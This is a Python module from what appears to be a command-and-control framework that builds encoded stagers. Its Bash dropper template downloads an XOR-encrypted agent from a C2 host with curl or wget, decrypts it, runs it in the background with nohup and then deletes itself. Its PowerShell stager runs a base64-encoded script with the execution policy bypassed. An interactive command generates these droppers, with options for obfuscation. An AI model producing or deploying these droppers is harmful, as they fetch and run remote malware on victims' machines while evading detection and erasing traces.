import base64
import warnings

def _generate_encoded_powershell_dropper(listener_info: dict) -> str:
    host = listener_info.get('host')
    port = listener_info.get('port')
    protocol = listener_info.get('type', 'http')
    c2_url = f"{protocol}://{host}:{port}"
    
    download_uri = listener_info.get('download_uri', '/api/assets/main.js')
    full_agent_url = f"{c2_url}{download_uri}"
    
    import os
    secret_key = os.environ.get('SECRET_KEY')
    if not secret_key:
        raise Exception("SECRET_KEY environment variable not found during dropper generation!")

    import os
    template_path = os.path.join(os.path.dirname(__file__), 'powershell_inmemory_template.txt')
    with open(template_path, 'r') as f:
        powershell_template_content = f.read()
    
    powershell_template = powershell_template_content.format(
        secret_key=secret_key,
        full_agent_url=full_agent_url
    )
    encoded_script = base64.b64encode(powershell_template.encode('utf-16le')).decode('utf-8')
    stager = f"powershell -exec bypass -enc {encoded_script}"
    return stager


def _generate_encoded_bash_dropper(listener_info: dict) -> str:
    host = listener_info.get('host')
    port = listener_info.get('port')
    protocol = listener_info.get('type', 'http')
    c2_url = f"{protocol}://{host}:{port}"
    
    download_uri = listener_info.get('download_uri', '/api/assets/main.js')
    full_agent_url = f"{c2_url}{download_uri}"

    import os
    secret_key = os.environ.get('SECRET_KEY')
    if not secret_key:
        raise Exception("SECRET_KEY environment variable not found during dropper generation!")

    bash_template = f'''#!/bin/bash
# Use the SECRET_KEY embedded during dropper generation
SECRET_KEY="{secret_key}"

# Download the encrypted agent from the C2 server
AGENT_URL="{full_agent_url}"
ENCRYPTED_AGENT_DATA=$(curl -k -s "$AGENT_URL" 2>/dev/null || wget --no-check-certificate -qO- "$AGENT_URL" 2>/dev/null)
if [ -z "$ENCRYPTED_AGENT_DATA" ]; then
    # Silently exit if download fails
    exit 1
fi

# Clean the downloaded data to remove any whitespace, newlines, etc.
ENCRYPTED_AGENT_DATA=$(echo "$ENCRYPTED_AGENT_DATA" | tr -d '\\n\\r\\t ' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')

# Perform XOR decryption to get raw bytes
DECRYPTED_AGENT=$(python3 -c "
import sys, base64
data = sys.argv[1].strip()  # Strip whitespace/newlines
key = sys.argv[2]
try:
    encrypted_bytes = base64.b64decode(data.encode('utf-8'))
except:
    encrypted_bytes = data.encode('utf-8')
key_bytes = key.encode('utf-8')
decrypted_bytes = bytearray()
for i in range(len(encrypted_bytes)):
    decrypted_bytes.append(encrypted_bytes[i] ^ key_bytes[i % len(key_bytes)])
# Check if it looks like Python code by looking for common Python patterns
decrypted_text = decrypted_bytes.decode('utf-8', errors='ignore')
if any(x in decrypted_text for x in ['import ', 'def ', 'class ', 'if __name__', 'from ']):
    # It's Python code, save to temporary file and return file path
    import tempfile
    import os
    temp_file = tempfile.NamedTemporaryFile(delete=False, suffix='.py')
    temp_file.write(decrypted_bytes)
    temp_file.close()
    print('PYTHON:' + temp_file.name)
else:
    # It's binary data, save to temporary file and return file path
    import tempfile
    import os
    temp_file = tempfile.NamedTemporaryFile(delete=False, suffix='.bin')
    temp_file.write(decrypted_bytes)
    temp_file.close()
    print('BINARY:' + temp_file.name)
" "$ENCRYPTED_AGENT_DATA" "$SECRET_KEY" 2>/dev/null)

if [ -z "$DECRYPTED_AGENT" ]; then
    # Silently exit if decryption fails
    exit 1
fi

# Check the payload type and handle accordingly
PAYLOAD_TYPE=$(echo "$DECRYPTED_AGENT" | cut -d':' -f1)
PAYLOAD_CONTENT=$(echo "$DECRYPTED_AGENT" | cut -d':' -f2-)

if [ "$PAYLOAD_TYPE" = "PYTHON" ]; then
    # Execute Python payload by running the temporary file with python
    nohup python3 "$PAYLOAD_CONTENT" > /dev/null 2>&1 &
    # Schedule cleanup of the temporary Python file
    (sleep 10 && rm -f "$PAYLOAD_CONTENT" 2>/dev/null) &
elif [ "$PAYLOAD_TYPE" = "BINARY" ]; then
    # Execute binary payload by making it executable and running it
    chmod +x "$PAYLOAD_CONTENT"
    nohup "$PAYLOAD_CONTENT" > /dev/null 2>&1 &
    # Schedule cleanup of the temporary binary file
    (sleep 10 && rm -f "$PAYLOAD_CONTENT" 2>/dev/null) &
fi

# Wait a bit for the process to start, then delete this script
sleep 2
CURRENT_SCRIPT="$0"
rm -f "$CURRENT_SCRIPT"
'''
    encoded_script = base64.b64encode(bash_template.encode('utf-8')).decode('utf-8')
    stager = f'bash -c "$(echo \'{encoded_script}\' | base64 -d)"'
    return stager


def handle_interactive_stager_command(command_parts: list, session: object) -> tuple:
    if len(command_parts) < 2:
        help_text = """
**Actions:**
  `generate`   - Generate a stager payload.
  `list`       - List available stager types.

**Options for droppers:**
  `host=<ip>`          - The IP address or hostname to download from.
  `port=<port>`        - The port to download from.
  `protocol=<http|https>` - The protocol (defaults to `http`).
  `download_uri=<uri>` - The endpoint to download the agent from (defaults to `/api/assets/main.js`).

**Example:**
  `stager generate powershell_dropper host=10.10.10.5 port=80 protocol=http`
  `stager generate bash_dropper host=10.10.10.5 port=80 protocol=http`
"""
        return help_text, 'info'

    action = command_parts[1].lower()

    if action == 'generate':
        if len(command_parts) < 3:
            return "Invalid Syntax. Usage: `stager generate <type> [options]`", 'error'

        stager_type = command_parts[2].lower()
        
        options = {}
        for part in command_parts[3:]:
            if '=' in part:
                key, value = part.split('=', 1)
                if value.lower() == 'true':
                    value = True
                elif value.lower() == 'false':
                    value = False
                options[key.lower()] = value

        if stager_type == 'cross_platform':
            listener_id = options.get('listener_id')
            obfuscate = options.get('obfuscate', False)
            
            if not listener_id:
                return "Missing Arguments. `listener_id` is required for cross-platform stagers.", 'error'
            
            try:
                if not hasattr(session, 'db') or session.db is None:
                    return "Error: Session database not available.", 'error'
                
                if not hasattr(session, 'config') or session.config is None:
                    return "Error: Session configuration not available.", 'error'
                
                from agents.payload_generator import PayloadGenerator
                payload_gen = PayloadGenerator(session.config, session.db)
                
                payload = payload_gen.generate_payload(
                    listener_id=listener_id,
                    payload_type="cross_platform_stager",
                    obfuscate=bool(obfuscate),
                    bypass_amsi=False  # Cross-platform stagers don't need AMSI bypass
                )
                
                return payload, 'success'
                
            except Exception as e:
                return f"Cross-platform stager generation failed: {e}", 'error'
        
        elif stager_type in ['powershell_dropper', 'bash_dropper']:
            host = options.get('host')
            port = options.get('port')
            protocol = options.get('protocol', 'http').lower()
            download_uri = options.get('download_uri', '/api/assets/main.js')

            if not (host and port):
                return "Missing Arguments. Both `host` and `port` are required for droppers.", 'error'
            
            if protocol not in ['http', 'https']:
                return "Invalid Protocol. Must be `http` or `https`.", 'error'

            try:
                listener_info = {
                    "host": host,
                    "port": port,
                    "type": protocol,
                    "download_uri": download_uri
                }

                if stager_type == 'powershell_dropper':
                    return _generate_encoded_powershell_dropper(listener_info), 'success'
                elif stager_type == 'bash_dropper':
                    return _generate_encoded_bash_dropper(listener_info), 'success'
            except Exception as e:
                return f"Dropper generation failed: An unexpected error occurred: {e}", 'error'
        else:
            return f"Unsupported Type: '{stager_type}'. Available: `cross_platform`, `powershell_dropper`, `bash_dropper`.", 'error'

    elif action == 'list':
        output = """
**Available Stager Types:**
─────────────────────────────────────
  `powershell_dropper` - PowerShell shellcode dropper(in-memory exec) downloading from /api/assets/main.js
  `bash_dropper`       - Simple Bash (py and .bin dropper) /api/assets/main.js (nohup)
─────────────────────────────────────
"""
        return output, 'success'
    else:
        return f"Unknown Action: '{action}'. Available: `generate`, `list`.", 'error'
